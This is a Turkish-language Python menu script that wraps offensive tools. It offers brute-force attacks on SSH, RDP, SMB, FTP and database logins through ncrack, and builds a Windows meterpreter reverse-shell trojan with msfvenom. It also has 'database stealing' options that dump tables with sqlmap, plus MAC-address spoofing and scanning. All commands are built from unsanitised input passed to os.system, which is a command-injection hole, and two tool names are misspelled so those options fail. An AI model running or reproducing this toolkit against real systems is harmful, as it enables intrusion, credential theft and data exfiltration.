#!/usr/bin/env python3
import os

# os.system("apt-get install figlet")
os.system("clear")
os.system("figlet MRZ.BSCS")

while True:
    print("""

    MRZBSCS Aracına Hoş Geldiniz:

    1) Hızlı Port Tarama (nmap)
    2) Servis Ve Sistem Bilgisi (nmap)
    3) İşletim Sistemi Bilgisi (nmap)
    4) Zafiyet Tarama (nikto)
    5) Exploit Arama (searchsloit)
    6) Firewall Tespit (wafw00f)
    7) Brute Force Attack FTP (ncrack)
    8) Brute Force SSH (ncrack)
    9) Brute Force Telnet (ncrack)
    10) Brute Force HTTP (ncrack)
    11) Brute Force SMB (ncrack)
    12) Brute Force RDP (ncrack)
    13) Brute Force SIP (ncrack)
    14) Brute Force Redis (ncrack)
    15) Brute Force VNC (ncrack)
    16) Brute Force PostgreSQL (ncrack)
    17) Brute Force MySQL (ncrack)
    18) ROOTKIT Tarama (chrootkit)  
    19) Trojan Oluşturma (msfvenom (windows reverse_tcp))
    20) Veri Tabanı Çalma (Sadece açık olan link biliniyor)
    21) Veri Tabanı Çalma (Açık olan link ve veritabanı adı biliniyor)
    22) Veri Tabanı Çalma (Açık olan link, veritabanı adı ve tablo adı biliniyor)
    23) Veri Tabanı Çalma (Açık olan link, veritabanı adı, tablo adı ve kolon adı biliniyor)
    24) Wordlist Oluşturma (crunch)
    25) Zaafiyet Analizi (lynis)
    26) Wordpress Hızlı Tarama (wpscan)
    27) VPN Kontrol (ike-scan)
    28) MAC Adresini Random Değiştirme (macchanger),
    29) MAC Adresini Elle Belirleme (macchanger)
    30) MAC Adresini Orijinale Döndürme (macchanger)

    Çıkış yapmak için \033[91mexit\033[0m yazınız
    
    """)
    islemno = input("İşlem Numarası Giriniz: ")
    if islemno == "1":
        target_ip = input("Hedef IP Giriniz: ")
        os.system("nmap {}".format(target_ip))

    elif islemno == "2":
        target_ip = input("Hedef IP Giriniz: ")
        os.system("nmap -sS -sV {}".format(target_ip))

    elif islemno == "3":
        target_ip = input("Hedef IP Giriniz: ")
        os.system("nmap -O --fuzzy {}".format(target_ip))

    elif islemno == "4":
        target_ip = input("Hedef IP Giriniz: ")
        os.system("nikto -h {}".format(target_ip))

    elif islemno == "5":
        keyword = input("Anahtar Kelime Giriniz: ")
        os.system("searchsloit {}".format(keyword))

    elif islemno == "6":
        site_addr = input("Site Adresi Giriniz: ")
        os.system("wafw00f {}".format(site_addr))

    elif islemno in ["7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17"]:
        target_ip = input("Hedef IP Giriniz: ")
        username = input("Username Giriniz: ")
        password = input("Password Dosya Pathi Giriniz: ")

        port_haritasi = {
            "7": "21",  # FTP
            "8": "22",  # SSH
            "9": "23",  # Telnet
            "10": "80",  # HTTP
            "11": "445",  # SMB
            "12": "3389",  # RDP
            "13": "5060",  # SIP
            "14": "6379",  # Redis
            "15": "5900",  # VNC
            "16": "5432",  # PostgreSQL
            "17": "3306"  # MySQL
        }

        choosen_port = port_haritasi[islemno]
        os.system("ncrack -p {} -u {} -P {} {}".format(choosen_port, username, password, target_ip))

    elif islemno == "18":
        os.system("chrootkit")

    elif islemno == "19":
        target_ip = input("Local Veya Dış IP Giriniz: ")
        port_num = input("Port Giriniz: ")
        save_path = input("Kayıt Yeri Giriniz: ")
        os.system(
            "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o {} ".format(target_ip, port_num,
                                                                                                 save_path))

    elif islemno == "20":
        vuln_link = input("Linki Giriniz: ")
        os.system("sqlmap -u {} --dbs --random-agent".format(vuln_link))

    elif islemno == "21":
        vuln_link = input("Linki Giriniz: ")
        db_name = input("Veritabanı Adını Giriniz: ")
        os.system("sqlmap -u {} -D {} --tables --random-agent".format(vuln_link, db_name))

    elif islemno == "22":
        vuln_link = input("Linki Giriniz: ")
        db_name = input("Veritabanı Adını Giriniz: ")
        table_name = input("Tablo Adını Giriniz: ")
        os.system("sqlmap -u {} -D {} -T {} --columns --random-agent".format(vuln_link, db_name, table_name))

    elif islemno == "23":
        vuln_link = input("Linki Giriniz: ")
        db_name = input("Veritabanı Adını Giriniz: ")
        table_name = input("Tablo Adını Giriniz: ")
        column_name = input("Kolon Adını Giriniz")
        os.system(
            "sqlmap -u {} -D {} -T {} -C {} --dump --random-agent".format(vuln_link, db_name, table_name, column_name))

    elif islemno == "24":
        min_char = input("Minumum Karakter Sayısını Giriniz: ")
        max_char = input("Maximum Karakter Sayisini Giriniz: ")
        character = input("İstediğiniz Karakterleri Giriniz: ")
        save_path = input("Kayıt Yeri Giriniz: ")
        os.system("crunch {} {} {} -o {}".format(min_char, max_char, character, save_path))

    elif islemno == "25":
        os.system("lynis audit system")

    elif islemno == "26":
        site_addr = input("Site Adresi Giriniz: ")
        os.system("wpscan --url {}".format(site_addr))

    elif islemno == "27":
        target_ip = input("Hedef IP Giriniz: ")
        os.system("ike-scan {}".format(target_ip))

    elif islemno == "28":
        interface_name = input("Interface İsmini Giriniz (örn: eth0): ")
        os.system("ifconfig {} down".format(interface_name))
        os.system("macchanger -r {}".format(interface_name))
        os.system("ifconfig {} up".format(interface_name))
        print("\033[92mYeni Mac Adresi Random Belirlendi")

    elif islemno == "29":
        interface_name = input("Interface İsmini Giriniz (örn: eth0): ")
        mac_addr = input("İstediğiniz MAC Adresini Giriniz: ")
        os.system("ifconfig {} down".format(interface_name))
        os.system("macchanger --mac {} {}".format(mac_addr, interface_name))
        os.system("ifconfig {} up".format(interface_name))
        print("\033[92mYeni Mac Adresi Elle Belirlendi")

    elif islemno == "30":
        interface_name = input("Interface İsmini Giriniz (örn: eth0): ")
        os.system("ifconfig {} down".format(interface_name))
        os.system("macchanger -p {}".format(interface_name))
        os.system("ifconfig {} up".format(interface_name))
        print("\033[92mMac Adresi Orijinale Döndü\033[0m")

    elif islemno == "exit":
        quit()

    else:
        print("Hatalı giriş")
